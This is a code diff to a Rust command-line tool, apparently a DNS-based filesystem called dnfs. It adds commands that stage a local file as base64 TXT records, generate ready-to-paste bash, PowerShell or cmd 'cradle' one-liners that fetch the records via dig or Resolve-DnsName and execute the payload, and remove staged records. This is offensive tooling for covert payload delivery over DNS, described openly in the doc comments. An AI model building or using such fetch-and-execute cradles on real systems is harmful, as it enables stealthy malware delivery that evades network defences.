@@ -1,3 +1,4 @@
+use dnfs::cradle;
 use dnfs::crypto;
 use dnfs::dns;
 use dnfs::fs;
@@ -228,6 +229,75 @@ enum Commands {
         args: Vec<String>,
     },
 
+    /// Stage a payload into DNS TXT records for cradle-based execution
+    ///
+    /// Uploads a local file as sequential base64-encoded TXT records that
+    /// can be fetched and executed by native OS tools (dig, Resolve-DnsName).
+    ///
+    /// NOTE: Staged payloads are NOT encrypted — they are plain base64.
+    /// This is inherent to cradle compatibility (native tools can't decrypt).
+    ///
+    /// Examples:
+    ///   dnfs stage -d stg.example.com -f ./payload.sh -l myloader
+    ///   dnfs stage -d local.dnfs -b local -f ./agent -l agent --type elf
+    Stage {
+        #[command(flatten)]
+        conn: ConnArgs,
+
+        /// Local file to stage
+        #[arg(short, long)]
+        file: PathBuf,
+
+        /// Label for the staged payload (used in DNS record names)
+        #[arg(short, long)]
+        label: String,
+
+        /// Payload type (auto-detected if omitted)
+        #[arg(long, value_name = "TYPE")]
+        r#type: Option<String>,
+    },
+
+    /// Generate a cradle one-liner to fetch and execute a staged payload
+    ///
+    /// Outputs a ready-to-paste command for the target shell that queries
+    /// DNS TXT records, reassembles the payload, and executes it.
+    ///
+    /// Examples:
+    ///   dnfs cradle -c bash -d stg.example.com -l myloader
+    ///   dnfs cradle -c pwsh -d stg.example.com -l agent -n 8.8.8.8
+    ///   dnfs cradle -c cmd -d stg.example.com -l agent
+    Cradle {
+        #[command(flatten)]
+        conn: ConnArgs,
+
+        /// Target shell (bash, pwsh, cmd)
+        #[arg(short, long)]
+        shell: String,
+
+        /// Label of the staged payload
+        #[arg(short, long)]
+        label: String,
+
+        /// DNS server for the cradle to query (e.g., 1.1.1.1, 8.8.8.8)
+        #[arg(short, long)]
+        ns: Option<String>,
+    },
+
+    /// Remove a staged payload from DNS
+    ///
+    /// Deletes all TXT records (metadata + chunks) for a staged label.
+    ///
+    /// Example:
+    ///   dnfs unstage -d stg.example.com -l myloader
+    Unstage {
+        #[command(flatten)]
+        conn: ConnArgs,
+
+        /// Label of the staged payload to remove
+        #[arg(short, long)]
+        label: String,
+    },
+
     /// Delete ALL records under the domain — IRREVERSIBLE
     ///
     /// Removes every DNS record associated with this Dn(f)s volume.
@@ -419,6 +489,80 @@ fn main() {
                 eprintln!("Execution failed: {}", e);
                 std::process::exit(1);
             }
+        }
+
+        Commands::Stage { conn, file, label, r#type } => {
+            let data = std::fs::read(&file).unwrap_or_else(|e| {
+                eprintln!("Failed to read {}: {}", file.display(), e);
+                std::process::exit(1);
+            });
+
+            let payload_type = r#type.map(|t| t.parse::<cradle::PayloadType>().unwrap_or_else(|e| {
+                eprintln!("Invalid type: {}", e);
+                std::process::exit(1);
+            }));
+
+            let backend = make_backend(&conn);
+            let rt = tokio::runtime::Runtime::new().unwrap();
+
+            eprintln!("Staging {} ({} bytes) as '{}'...", file.display(), data.len(), label);
+            rt.block_on(async {
+                match cradle::stage_payload(backend.as_ref(), &conn.domain, &label, &data, payload_type).await {
+                    Ok(meta) => {
+                        eprintln!("Staged: {} chunks, type={}, hash={}",
+                            meta.chunks, meta.payload_type, meta.hash);
+                        eprintln!("\nGenerate cradles with:");
+                        eprintln!("  dnfs cradle -c bash -d {} -l {}", conn.domain, label);
+                        eprintln!("  dnfs cradle -c pwsh -d {} -l {}", conn.domain, label);
+                    }
+                    Err(e) => {
+                        eprintln!("Stage failed: {}", e);
+                        std::process::exit(1);
+                    }
+                }
+            });
+        }
+
+        Commands::Cradle { conn, shell, label, ns } => {
+            let shell_type = shell.parse::<cradle::Shell>().unwrap_or_else(|e| {
+                eprintln!("{}", e);
+                std::process::exit(1);
+            });
+
+            let backend = make_backend(&conn);
+            let rt = tokio::runtime::Runtime::new().unwrap();
+
+            let meta = rt.block_on(async {
+                cradle::read_stage_meta(backend.as_ref(), &conn.domain, &label).await
+            }).unwrap_or_else(|e| {
+                eprintln!("Failed to read stage metadata: {}", e);
+                std::process::exit(1);
+            });
+
+            let cradle_str = cradle::generate_cradle(
+                shell_type,
+                &conn.domain,
+                &label,
+                &meta,
+                ns.as_deref(),
+            );
+            println!("{}", cradle_str);
+        }
+
+        Commands::Unstage { conn, label } => {
+            let backend = make_backend(&conn);
+            let rt = tokio::runtime::Runtime::new().unwrap();
+
+            eprintln!("Removing staged payload '{}'...", label);
+            rt.block_on(async {
+                match cradle::unstage_payload(backend.as_ref(), &conn.domain, &label).await {
+                    Ok(count) => eprintln!("Deleted {} records", count),
+                    Err(e) => {
+                        eprintln!("Unstage failed: {}", e);
+                        std::process::exit(1);
+                    }
+                }
+            });
         }
 
         Commands::Nuke { conn, yes } => {
